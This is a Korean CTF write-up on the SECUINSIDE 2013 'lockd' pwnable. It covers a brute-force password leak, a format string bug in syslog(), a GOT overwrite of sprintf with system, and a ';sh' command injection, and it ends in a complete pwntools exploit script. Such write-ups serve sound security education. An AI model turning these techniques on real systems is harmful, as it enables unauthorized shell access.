+++
title = "SECUINSIDE CTF 2013 - lockd"
date = "2024-07-19"
description = "SECUINSIDE CTF 2013 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fsb"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/lockd'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 0x01. Vulnerability
### Leak password
``` c
int main()
{
  ...
  printf("Input floor > ");
  __isoc99_scanf("%d", &floor_804A4C0);
  printf("Room number > ");
  __isoc99_scanf("%d", &room_804A0A0);
  if ( floor_804A4C0 <= 4 && room_804A0A0 <= 10 && !read_password_8048A7D() )
  {
    ...
  }
  return -1;
}
```
`main()`의 핵심적인 `lock()`, `unlock()` 기능을 사용하기 위해서는 `floor_804A4C0`, `room_804A0A0` 값을 범위에 맞게 입력하고, `read_password_8048A7D()`의 결과가 `True`여야 한다.
``` c
int read_password_8048A7D()
{
  FILE *fd; // [esp+10h] [ebp-38h]
  char buf[20]; // [esp+14h] [ebp-34h] BYREF
  char password[20]; // [esp+28h] [ebp-20h] BYREF
  int canary; // [esp+3c] [ebp-c]

  *&password[20] = __readgsdword(0x14u);
  fd = fopen("password", "rb");
  fread(password, 1u, 0x10u, fd);
  fclose(fd);
  *password_804A0A4 = *password;
  *&password_804A0A4[4] = *&password[4];
  *&password_804A0A4[8] = *&password[8];
  *&password_804A0A4[12] = *&password[12];
  printf("Input master key > ");
  read(0, buf, 40u);
  return memcmp(password, buf, 16u);
}
```
`read_password_8048A7D()`를 보면 `read()`에서 40바이트를 읽으며 지역변수 `password`의 값을 조작할 수 있지만, `lock()`이나 `unlock()`에서는 전역변수 `password_804A0A4`의 값과 비교하기 때문에 의미가 없다.

대신 다른 공격이 가능한데, `password`의 마지막 1바이트를 남겨놓고 `buf`와 같은 값으로 덮으면 1바이트씩 brute forcing이 가능하다.
### FSB in syslog
``` c
int lock_8048877()
{
  printf("Input master key > ");
  read(0, fmt_0804A0C0, 20u);
  if ( memcmp(password_804A0A4, fmt_0804A0C0, 16u) )
    return -1;
  sprintf(fmt_0804A0C0, "./lock LOCK %d %d", floor_804A4C0, room_804A0A0);
  system(fmt_0804A0C0);
  printf("Your name > ");
  read(0, name_804A2C0, 0x190u);
  sprintf(fmt_0804A0C0, "LOCK %d-%d by %s", floor_804A4C0, room_804A0A0, name_804A2C0);
  syslog(13, fmt_0804A0C0);
  return 0;
}
```
`password` leak에 성공하면 `lock()`과 `unlock()`의 기능을 사용할 수 있다.

이 중에서 `syslog()`에 대해서 자세하게 살펴보면,
``` c
void syslog(int priority, const char *format, ...);
```
두 번째 인자 `format`은 format string으로, [Linux manual page](https://man7.org/linux/man-pages/man3/syslog.3.html)에서도 관련 내용을 확인할 수 있다.

> Never pass a string with user-supplied data as a format, use the following instead:
> 
> syslog(priority, "%s", string);

그런데 `lock()`에서는 `syslog(13, fmt_0804A0C0);` 형식으로 사용하고 있기 때문에 `fmt_0804A0C0`에 format string을 넣어주면 FSB가 발생한다.

다행히 `name_804A2C0`를 통해 `fmt_0804A0C0`에 format string을 전달할 수 있으므로, 취약점을 활용할 수 있다.

## 0x02. Exploit
평소처럼 FSB를 활용하려면 payload를 `%p %p %p %p ...` 이런 식으로 구성해서 몇 번째 format string부터 `$esp`가 가리키는 부분인지 확인했을텐데, `syslog()`는 `/var/log/syslog`에 로그를 남길 뿐이라서 결과를 확인할 수가 없었다.

결국 `%?$n`에서 `?`값을 늘려가며 언제 어디에 값이 써지는지 매뉴얼 확인을 했다.

그 결과 `$esp`에서 n번째 메모리는 `%(n + 2)$n`으로 접근할 수있다는 것을 확인했다.

또한 우리가 입력한 format string만 출력되는 것이 아니라 `"LOCK %d-%d by %s"` 문자열의 `%s` 부분에 format string이 들어가므로 12바이트만큼 값이 더 써진다.

따라서 다음과 같이 payload를 작성했다.
``` python
    # %n$ -> pointing (n + 2)th dword from esp
    value = elf.got['sprintf']
    index = 26
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
```
이제 exploit을 위해 `syslog()`를 호출할 때의 stack을 보면 다음과 같다.
``` bash
gef➤  x/20wx $esp
0xffffdcc0:     0x0000000d      0x0804a0c0      0x00000001      0x00000002
0xffffdcd0:     0x0804a2c0      0x08048cb1      0xf7e760d9      0xf7fcd000
0xffffdce0:     0x00000000      0x00000000      0xffffdd18      0x0804883a
0xffffdcf0:     0x08048c9f      0xffffdd08      0x00000002      0x00000000
0xffffdd00:     0xf7fcd3c4      0xf7ffd000      0x00000001      0xf7fcd000
gef➤  x/20wx $esp + 0x50
0xffffdd10:     0x08048b90      0x00000000      0x00000000      0xf7e39af3
0xffffdd20:     0x00000001      0xffffddb4      0xffffddbc      0xf7feae6a
0xffffdd30:     0x00000001      0xffffddb4      0xffffdd54      0x0804a02c
0xffffdd40:     0x08048328      0xf7fcd000      0x00000000      0x00000000
0xffffdd50:     0x00000000      0x3cf1e46c      0x047ec07c      0x00000000
gef➤  x/20wx $esp + 0xa0
0xffffdd60:     0x00000000      0x00000000      0x00000001      0x08048670
0xffffdd70:     0x00000000      0xf7ff0660      0xf7e39a09      0xf7ffd000
0xffffdd80:     0x00000001      0x08048670      0x00000000      0x08048691
0xffffdd90:     0x08048724      0x00000001      0xffffddb4      0x08048b90
0xffffdda0:     0x08048c00      0xf7feb300      0xffffddac      0x0000001c
gef➤  x/20wx $esp + 0xf0
0xffffddb0:     0x00000001      0xffffdec4      0x00000000      0xffffded6
0xffffddc0:     0xffffdeec      0xffffdefd      0xffffdf0e      0xffffdf50
0xffffddd0:     0xffffdf56      0xffffdf66      0xffffdf73      0xffffdf89
0xffffdde0:     0xffffdfa3      0xffffdfb7      0xffffdfd1      0x00000000
0xffffddf0:     0x00000020      0xf7fda540      0x00000021      0xf7fda000
gef➤  x/20wx $esp + 0x140
0xffffde00:     0x00000033      0x000006f0      0x00000010      0x178bfbff
0xffffde10:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffde20:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffde30:     0x00000005      0x00000009      0x00000007      0xf7fdc000
0xffffde40:     0x00000008      0x00000000      0x00000009      0x08048670
```
모든 입력을 전역변수에 받기 때문에 stack에 있는 값을 잘 이용해서 exploit을 해야한다.

처음에는 4바이트가 한번에 써질거라고 생각을 못해서
``` bash
gef➤  x/wx $esp + 0x64
0xffffdd24:     0xffffddb4
gef➤  x/wx 0xffffddb4
0xffffddb4:     0xffffdec4
```
1. `0xffffddb4`에 `0x00` write
  - 0xffffddb4:     0xffffde00
2. `0xffffde00`에 2바이트 write (하위 2바이트)
  - 0xffffde00:     0x0000a03c
3. `0xffffddb4`에 `0x02` write
  - 0xffffddb4:     0xffffde02
4. `0xffffde00`에 2바이트 write (상위 2바이트)
  - 0xffffde00:     0x0804a03c
5. `0x0804a03c`(sprintf got)에 2바이트 write

이런 식으로 exploit을 진행하려고 했으나, ASLR을 키고 나니까 상황이 달라졌다.
``` bash
gef➤  x/wx $esp+0x64
0xff8ca684:     0xff8ca714
gef➤  x/wx 0xff8ca714
0xff8ca714:     0xff8caec4
```
ASLR이 꺼진 경우 `0xffffddb4`가 `0xffffdec4`를 가리키고 있어 `0xffffde??` 영역을  컨트롤할 수 있는 반면

ASLR이 켜진 경우 `0xff8ca714`가 `0xff8caec4`를 가리키고 있어 `0xff8cae??` 영역을 컨트롤할 수 있다.

이러면 `sprintf()`의 got 주소를 stack에 잘 구성해놓고 정작 `%?$n`으로 접근할 때 `?` 값이 일정하지 않다는 문제가 발생한다.

그렇게 확률 이슈로 한참 고생을 하다가 알게 된 사실이 `0x0804a03c`가 한 번에 쓰여진다는 것인데, 그러면 exploit이 상당히 간결해진다.

1. `0xffffddb4`에 `0x0804a03c`(sprintf got) write
  - 0xffffddb4:     0x0804a03c
2. `0x0804a03c`에 `0x080485e0`(system plt) write
  - 0x0804a03c:     0x080485e0

참고로 `sprintf()`를 `system()`으로 덮는 아이디어는 첫 번째 인자에 내가 컨트롤할 수 있는 값이 들어가는 함수가 `sprintf()`밖에 없었다.

``` c
  read(0, fmt_0804A0C0, 20u);
  if ( memcmp(password_804A0A4, fmt_0804A0C0, 16u) )
    return -1;
  sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
```
첫 번째 인자인 `fmt_0804A0C0`에 `password`가 담겨있어야 하는데, 다행히 `memcmp()`를 16바이트만 하는 반면 입력은 20바이트를 받으므로 4바이트의 여유 공간이 생긴다.

따라서 key 뒤에 `;sh`를 넣어주면 got overwrite가 성공했을 때 다음과 같이 함수가 실행된다.
``` c
  // sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
  system("c39f30e348c07297;sh");
```
앞의 `c39f30e348c07297` 부분은 없는 명령이므로 무시되고, 다음 명령인 `sh`가 실행되어 shell을 실행시킬 수 있다.

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = True
BINARY = "lockd"
bp = {
    'read_password' : 0x08048A7D,
    'unlock' : 0x804897A,
    'lock' : 0x8048877,
    'syslog_of_lock' : 0x804896e,
}

gs = f'''
b *{bp["syslog_of_lock"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def floor_and_room(s, floor, room):
    s.recv()
    s.sendline(str(floor).encode())
    s.recv()
    s.sendline(str(room).encode())
    s.recv()

def lock(s, key, name):
    s.sendline(b"1")
    s.recv()
    s.sendline(key)
    s.recv()
    s.sendline(name)
    return s.recv()

def guess_key(s):
    key = []
    for i in range(16):
        for j in range(256):
            s = remote("0.0.0.0", 8107)
            floor_and_room(s, 1, 2)
            payload = b"A" * (16 - len(key) - 1)
            payload += chr(j).encode()
            payload += ''.join(key).encode()
            payload += b"B" * 4
            payload += b"A" * (16 - len(key) - 1)
            s.send(payload)
            try:
                if s.recv():
                    key.insert(0, chr(j))
                    log.success(f"HIT : {key}")
                    s.close()
                    break
            except:
                s.close()
                continue
    return key

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)

    floor_and_room(s, 1, 2)
    
    # [+] key : c39f30e348c07297
    # key = ''.join(guess_key(s))
    # log.success(f"key : {key}")
    key = b"c39f30e348c07297"
    s.send(key)
    s.recv()

    log.info(f"key : {key}")
    log.info(f"sprintf got : {hex(elf.got['sprintf'])}")
    log.info(f"system plt : {hex(elf.plt['system'])}")

    # %n$ -> pointing (n + 2)th dword from esp
    value = elf.got['sprintf']
    index = 26
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
    
    value = elf.plt['system']
    index = 62
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
    
    s.sendline(b"1")
    s.recv()
    s.sendline(key + b";sh")
    s.interactive()

if __name__=='__main__':
    main()
```